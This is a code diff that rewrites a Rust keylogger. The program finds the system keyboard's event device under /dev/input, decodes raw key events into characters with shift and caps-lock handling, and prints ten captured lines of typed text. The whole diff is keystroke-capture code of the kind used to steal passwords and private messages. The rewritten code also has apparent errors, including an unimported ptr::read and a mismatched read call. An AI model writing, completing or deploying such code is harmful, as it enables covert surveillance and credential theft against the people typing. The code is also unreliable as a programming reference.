@@ -1,227 +1,179 @@
 use nix::fcntl::OFlag;
-use nix::sys::*;
-use nix::unistd::open;
-use std::any::TypeId;
+use nix::sys::stat::Mode;
+use nix::unistd::{close, open, read};
 use std::fs::File;
-use std::io::{self, BufRead, BufReader, Read};
+use std::io::{BufRead, BufReader};
 use std::mem;
 use std::os::unix::io::RawFd;
-use std::slice;
 
 const DEVICES: &str = "/proc/bus/input/devices";
-const LOGFILE: &str = "/tmp/data";
 const INPUTSTREAM: &str = "/dev/input/";
-const BUFFER_SIZE: i32 = 64;
-const BUFFER_SOFT_CAP: i32 = 25;
-const BUFFER_INCREASE: i32 = 2;
-const BUFFER_GOAL: i32 = 10;
+const BUFFER_SIZE: usize = 64;
+const BUFFER_SOFT_CAP: usize = 25;
+const BUFFER_GOAL: usize = 10;
 
-static KEYMAP: [&str; 60] = [
-    "",
-    "",
-    "1",
-    "2",
-    "3",
-    "4",
-    "5",
-    "6",
-    "7",
-    "8", // 0-9
-    "9",
-    "0",
-    "-",
-    "=",
-    "",
-    "",
-    "q",
-    "w",
-    "e",
-    "r", // 10-19
-    "t",
-    "y",
-    "u",
-    "i",
-    "o",
-    "p",
-    "[",
-    "]",
-    "n",
-    "", // 20-29
-    "a",
-    "s",
-    "d",
-    "f",
-    "g",
-    "h",
-    "j",
-    "k",
-    "l",
-    ";", // 30-39
-    "'",
-    "`",
-    "",
-    "",
-    "z",
-    "x",
-    "c",
-    "v",
-    "b",
-    "n", // 40-49
-    "m",
-    ",",
-    ".",
-    "/",
-    "",
-    "*",
-    "[LEFT_ALT]",
-    " ",
-    "",
-    "", // 50-59
+const KEYMAP: [&str; 60] = [
+    "", "", "1", "2", "3", "4", "5", "6", "7", "8", // 0-9
+    "9", "0", "-", "=", "", "", "q", "w", "e", "r", // 10-19
+    "t", "y", "u", "i", "o", "p", "[", "]", "n", "", // 20-29
+    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", // 30-39
+    "'", "`", "", "", "z", "x", "c", "v", "b", "n", // 40-49
+    "m", ",", ".", "/", "", "*", "[LEFT_ALT]", " ", "", "", // 50-59
 ];
 
-fn checkFileExists(file: Result<File, std::io::Error>) -> i32 {
-    match file {
-        Ok(_) => return 1,
-        Err(_) => return 0,
-    }
-}
+const KEY_BACKSPACE: u16 = 14;
+const KEY_ENTER: u16 = 28;
+const KEY_LEFTSHIFT: u16 = 42;
+const KEY_RIGHTSHIFT: u16 = 54;
+const KEY_CAPSLOCK: u16 = 58;
 
-fn getEvent() -> Option<&'static str> {
-    // setting return as result as it will be good for returning null
-    // values
-    let file = File::open(DEVICES).ok()?;
-    let filecheck = checkFileExists(&file);
-
-    if filecheck == 0 {
-        return None;
-    }
-
-    let mut line: &str; // char method because rust char only supports 32 bit
-    let mut finalToken: &str; // initalized token for memory relation
-    let mut reached_keyboard: i32 = 0;
-
-    if let Some(file) = Some(file) {
-        let reader = BufReader::new(file);
-
-        for line in reader.lines() {
-            let line = line.unwrap();
-
-            if line.find("AT Translated Set 2 Keyboard").is_some() {
-                reached_keyboard = 1
-            };
-
-            let mut token: Vec<&str> = &line.split('=').collect();
-
-            finalToken = &token[0];
-        }
-
-        if line.find("I:") {
-            reached_keyboard = 0
-        }
-    }
-
-    Some(finalToken)
-}
-
+#[repr(C)]
+#[derive(Debug)]
 struct InputEvent {
+    time: libc::timeval,
+    type_: u16,
     code: u16,
     value: i32,
 }
 
-fn interpretCharacter(
-    outputBuffer: &mut [i32],
-    InputEvent: &InputEvent,
-    bufferIndex: &mut usize,
-) -> i32 {
-    static shiftPressed: i32 = 0;
-    static capsEnabled: bool;
+fn get_event_file() -> Option<String> {
+    let file = File::open(DEVICES).ok()?;
+    let reader = BufReader::new(file);
 
-    match InputEvent.code {
-        KEY_BACKSPACE => {
-            if *bufferIndex > 0 {
-                *bufferIndex -= 1;
-            }
+    let mut event_file: Option<String> = None;
+    let mut reached_keyboard = false;
 
-            return 0;
+    for line in reader.lines() {
+        let line = line.ok()?;
+
+        if line.contains("AT Translated Set 2 keyboard") {
+            reached_keyboard = true;
         }
-        KEY_ENTER => {
-            if *bufferIndex < outputBuffer.len() {
-                outputBuffer[*bufferIndex] = b'\n' as i32;
-                *bufferIndex += 1;
+
+        if reached_keyboard && line.starts_with("H: Handlers=") {
+            let tokens: Vec<&str> = line.split_whitespace().collect();
+            for token in tokens {
+                if token.starts_with("event") {
+                    event_file = Some(token.to_string());
+                    break;
+                }
             }
-            return -1;
-        }
-        KEY_RIGHTSHIFT => {
-            if InputEvent.value != 0 {
-                shiftPressed = 1; // Type is returning unit type and not i32 fix tomorrow
-                !todo() //
-            };
-        }
-        KEY_CAPSLOCK => {
-            if InputEvent.value = 1 {
-                capsEnabled = !capsEnabled;
-            }
+            break;
         }
     }
+
+    event_file
 }
 
-fn inputBuffer(argc: i32, argv: &str, eventName: &str, temporaryBufferCount: i32) {
-    let mut outputBuffer: Vec<char> = Vec::with_capacity(BUFFER_SIZE);
-    let mut bufferIndex = 0;
-    let mut currentBuffer = BUFFER_SIZE;
+fn interpret_character(
+    code: u16,
+    value: i32,
+    shift_pressed: &mut bool,
+    caps_enabled: &mut bool,
+) -> Option<char> {
+    if value == 0 {
+        // Key release event
+        if code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT {
+            *shift_pressed = false;
+        }
+        return None;
+    } else if value == 1 || value == 2 {
+        // Key press or autorepeat
+        if code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT {
+            *shift_pressed = true;
+            return None;
+        }
 
-    let fileNameBuffer = INPUTSTREAM;
-    let result = &fileNameBuffer + &eventName;
-    let inputLogger: i32 = open(fileNameBuffer, OFlag::O_RDONLY);
-    let event_input = InputEvent { code: 0, value: 0 };
-    loop {
-        &inputLogger.read_exact(&mut event_input)?;
-        if TypeId::of::<i32>() == TypeId::of_val(&event_input) {
-            let result: i32 = interpretCharacter(outputBuffer, &event_input, &bufferIndex);
-            match result {
-                1 => break,
-                0 => break,
-                -1 => return outputBuffer,
+        if code == KEY_CAPSLOCK {
+            *caps_enabled = !*caps_enabled;
+            return None;
+        }
+
+        if code < KEYMAP.len() as u16 {
+            let mut ch = KEYMAP[code as usize];
+            if ch.is_empty() {
+                return None;
             }
-        }
 
-        if bufferIndex > (currentBuffer - BUFFER_SOFT_CAP) {
-            currentBuffer *= 2;
-            *temporaryBufferCount *= 2;
+            if *shift_pressed || *caps_enabled {
+                ch = &ch.to_uppercase();
+            }
+
+            return ch.chars().next();
+        } else if code == KEY_ENTER {
+            return Some('\n');
+        } else if code == KEY_BACKSPACE {
+            return Some('\x08'); // Backspace character
         }
     }
-}
 
-fn keylogBufferReceive(argc: i32, argv: &str, eventFileName: &str) {
-    let mut linebuffer: &str;
-    let mut lineCounter: i32 = 0;
-
-    while lineCounter <= BUFFER_GOAL {
-        let mut temporaryBufferCount: i32 = BUFFER_SIZE;
-        let mut receivedBuffer: &str =
-            inputBuffer(argc, argv, eventFileName, &temporaryBufferCount);
-
-        let result = linebuffer + receivedBuffer;
-
-        if receivedBuffer != None {
-            receivedBuffer = None;
-        }
-
-        lineCounter += 1;
-    }
-    return &linebuffer;
+    None
 }
 
 fn main() {
-    let result: &str = getEvent();
-    let mut keyLogBuffer = None;
+    let event_file_name = match get_event_file() {
+        Some(name) => name,
+        None => {
+            eprintln!("Failed to find keyboard event file.");
+            return;
+        }
+    };
+
+    let event_file_path = format!("{}{}", INPUTSTREAM, event_file_name);
+    let fd = match open(event_file_path.as_str(), OFlag::O_RDONLY, Mode::empty()) {
+        Ok(fd) => fd,
+        Err(err) => {
+            eprintln!("Failed to open {}: {}", event_file_path, err);
+            return;
+        }
+    };
+
+    let mut buffer: Vec<u8> = vec![0; mem::size_of::<InputEvent>()];
+    let mut output_buffer = String::new();
+    let mut shift_pressed = false;
+    let mut caps_enabled = false;
+    let mut line_counter = 0;
 
     loop {
-        keyLogBuffer = keylogBufferReceive(argc, argv, result);
-        println!("Ten Line Buffer: {}", keyLogBuffer);
+        let res = unsafe {
+            read(
+                fd,
+                buffer.as_mut_ptr() as *mut libc::c_void,
+                mem::size_of::<InputEvent>(),
+            )
+        };
+        if res <= 0 {
+            eprintln!("Error reading input event.");
+            break;
+        }
 
-        keyLogBuffer = None;
+        let input_event: InputEvent = unsafe { ptr::read(buffer.as_ptr() as *const _) };
+
+        if input_event.type_ == 1 {
+            // EV_KEY event
+            if let Some(ch) = interpret_character(
+                input_event.code,
+                input_event.value,
+                &mut shift_pressed,
+                &mut caps_enabled,
+            ) {
+                if ch == '\n' {
+                    line_counter += 1;
+                    println!("Buffer: {}", output_buffer);
+                    output_buffer.clear();
+
+                    if line_counter >= BUFFER_GOAL {
+                        break;
+                    }
+                } else if ch == '\x08' {
+                    // Handle backspace
+                    output_buffer.pop();
+                } else {
+                    output_buffer.push(ch);
+                }
+            }
+        }
     }
 
-    result = None;
+    close(fd).ok();
 }
